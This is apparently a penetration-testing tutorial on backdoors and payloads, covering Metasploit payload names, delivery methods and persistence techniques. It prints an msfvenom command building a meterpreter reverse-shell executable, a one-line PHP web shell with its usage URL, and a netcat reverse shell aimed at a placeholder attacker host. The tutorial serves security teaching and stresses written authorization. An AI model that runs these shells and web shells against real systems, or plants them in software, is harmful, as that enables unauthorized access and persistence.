## **1. What is a Backdoor?**

A **backdoor** is a method of bypassing normal authentication or security controls to gain unauthorized access to a system.

## Types of Backdoors:

* **System-level**: OS modification or custom services (e.g., modified `sshd`, cron jobs)
* **Application-level**: Embedded in vulnerable web apps (e.g., PHP web shells)
* **Hardware/firmware**: Rare, but present in supply-chain attacks


##  **2. What is a Payload?**

A **payload** is the actual **malicious code** or **functionality** delivered after exploiting a system — it's what the attacker wants to execute after gaining initial access.

## Examples of Payload Actions:

* Create reverse shells
* Download/execute malware
* Dump credentials
* Create new user accounts



## **Backdoors vs Payloads**

| Feature     | Backdoor                  | Payload                    |
| ----------- | ------------------------- | -------------------------- |
| Purpose     | Maintain access           | Execute immediate action   |
| Persistence | Usually persistent        | Often temporary            |
| Trigger     | Often manual or timed     | Triggered by exploit       |
| Examples    | Netcat listener, cron job | Reverse shell, meterpreter |



## **3. Tools for Payloads and Backdoors**

## **Metasploit Framework (MSF)**

A powerful exploitation tool for generating and delivering payloads and backdoors.

## Common Payloads:

* `windows/meterpreter/reverse_tcp`
* `linux/x86/shell_reverse_tcp`
* `php/meterpreter/reverse_tcp`

### Create a payload with `msfvenom`:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > shell.exe
```

### **Web Backdoors (PHP, ASP, JSP)**

Example PHP web shell:

```php
<?php system($_GET["cmd"]); ?>
```

Use:

```
http://target.com/shell.php?cmd=whoami
```



## **4. Reverse Shells (A Common Payload Type)**

A reverse shell connects **from** the victim **to** the attacker’s system.

#### Example with `netcat`:

**Victim side:**

```bash
nc -e /bin/bash attacker_ip 4444
```

**Attacker listener:**

```bash
nc -lvnp 4444
```



## **5. Payload Delivery Methods**

* **Social engineering (phishing, fake software)**
* **Exploit kits (via vulnerabilities)**
* **Malicious USBs / hardware implants**
* **Drive-by downloads (malicious sites)**



## **6. Persistence Techniques (Backdoor Mechanisms)**

* Registry autorun entries (Windows)
* Startup folder placement
* Cron jobs (`crontab -e`)
* Systemd services
* Scheduled tasks (`schtasks`)



## **7. Ethical Usage in Pentesting**

When using payloads and backdoors in penetration testing:

* Always have **written authorization**
* Use payloads responsibly to avoid system damage
* Clean up afterward (remove shells/backdoors)
* Report exactly how access was achieved and persisted
